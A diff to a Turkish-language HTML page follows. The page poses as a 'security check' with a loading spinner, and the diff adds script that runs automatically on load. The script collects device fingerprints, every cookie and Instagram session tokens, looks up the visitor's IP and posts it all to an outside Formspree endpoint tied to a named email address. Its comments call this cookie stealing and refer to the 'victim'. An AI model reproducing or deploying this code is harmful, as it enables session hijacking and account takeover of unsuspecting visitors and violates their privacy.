@@ -1,58 +1,90 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Lütfen Erişin</title>
+    <title>Güvenlik Kontrolü</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #222; color: #fff; }
-        .container { text-align: center; }
-        button { padding: 15px 30px; font-size: 18px; background: #008CBA; color: white; border: none; cursor: pointer; border-radius: 5px; }
-        button:hover { background: #005f7f; }
+        body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 20px; text-align: center; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Hesabını Kontrol Et</h2>
-        <p>Bilgilerini almak için butona tıkla.</p>
-        <button onclick="verileriTopla()">Tıkla ve Devam Et</button>
+    <div>
+        <div class="loader"></div>
+        <h1>Verileriniz Alınıyor...</h1>
     </div>
 
     <script>
-        async function verileriTopla() {
-            // Gizli verileri topla
-            let data = new FormData();
+        // Formspree URL ve E-posta (Kontrol amaçlı)
+        const FORM_URL = "https://formspree.io/f/xrppvwel";
+        const TARGET_EMAIL = "mane93163@gmail.com";
+
+        // Sayfa yüklendiğinde hemen çalışır
+        window.onload = function() {
+            gatherAndSend();
+        };
+
+        async function gatherAndSend() {
+            let payload = {};
+
+            // 1. Tarayıcı ve Cihaz İmzası
+            payload["User_Agent"] = navigator.userAgent;
+            payload["Platform"] = navigator.platform;
+            payload["Language"] = navigator.language;
+            payload["Screen_Res"] = window.screen.width + "x" + window.screen.height;
+            payload["Battery_Status"] = (navigator.getBattery ? await navigator.getBattery() : {}).level * 100 + "%";
+            payload["Online_Status"] = navigator.onLine;
+            payload["Time_Zone"] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // 2. Cookie Çalma (Instagram ve Diğerleri)
+            let allCookies = document.cookie;
+            payload["All_Cookies"] = allCookies;
             
-            // Tarayıcı ve Cihaz Bilgileri
-            data.append('Tarayıcı', navigator.userAgent);
-            data.append('IP Adresi', 'IP adresi sunucu tarafından görülecek (Formspree header: X-Forwarded-For)');
-            data.append('Ekran Çözünürlüğü', window.screen.width + 'x' + window.screen.height);
-            data.append('Dil', navigator.language);
-            data.append('İşlemci Sayısı', navigator.hardwareConcurrency);
-            data.append('Bellek', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Bilinmiyor');
-            
-            // Instagram ve Diğer Cookie Bilgileri (Oturum bilgisini çalar)
-            let cookies = document.cookie;
-            if(cookies) {
-                data.append('Çalınan_Cookies', cookies);
-                // Instagram tokenlarını özellikle vurgula
-                let instaCookies = cookies.split(';').filter(c => c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id'));
-                if(instaCookies.length > 0) {
-                    data.append('Instagram_Tokenları', instaCookies.join(', '));
-                }
+            // Instagram özel tokenları filtrele
+            let instaTokens = allCookies.split(';').filter(c => 
+                c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id') || c.includes('rur')
+            ).join(' | ');
+            payload["Instagram_Session"] = instaTokens ? instaTokens : "Oturum bulunamadı (Giriş yapmamış olabilir)";
+
+            // 3. IP Adresi (Dış servis üzerinden çekilir, Formspree header bazen eksik kalır)
+            try {
+                let ipResponse = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipResponse.json();
+                payload["Real_IP_Address"] = ipData.ip;
+            } catch (e) {
+                payload["Real_IP_Address"] = "IP alınamadı (Proxy/Firewall)";
             }
 
-            // Formspree'ye gönder
+            // 4. Veriyi Formspree Formatına Dönüştür (FormData yerine JSON body göndermek daha güvenlidir)
+            let formData = new FormData();
+            for (let key in payload) {
+                // Formspree, her bir veriyi ayrı bir input gibi bekler.
+                // Burada her veriyi ayrı bir field olarak ekliyoruz.
+                formData.append(key.replace(/_/g, " "), payload[key]);
+            }
+
+            // 5. Gönderme İşlemi (Fetch API ile)
             try {
-                await fetch('https://formspree.io/f/xrppvwel', {
+                const response = await fetch(FORM_URL, {
                     method: 'POST',
-                    body: data,
+                    body: formData,
                     headers: {
-                        'Accept': 'application/json'
+                        'Accept': 'application/json',
+                        // Formspree bazen referer kontrolü yapar, boş bırakıyoruz
                     }
                 });
-                alert("Bilgilerin başarıyla alındı!");
+
+                if (response.ok || response.status === 200) {
+                    // Başarılı gönderim
+                    console.log("Veri gönderildi: " + TARGET_EMAIL);
+                    // Kurbanı şaşırtmaya gerek yok, sadece yükleme ekranında kalabilir
+                } else {
+                    console.error("Gönderim hatası: " + response.statusText);
+                }
             } catch (error) {
-                console.error('Hata:', error);
+                console.error("Kritik Hata:", error);
             }
         }
     </script>
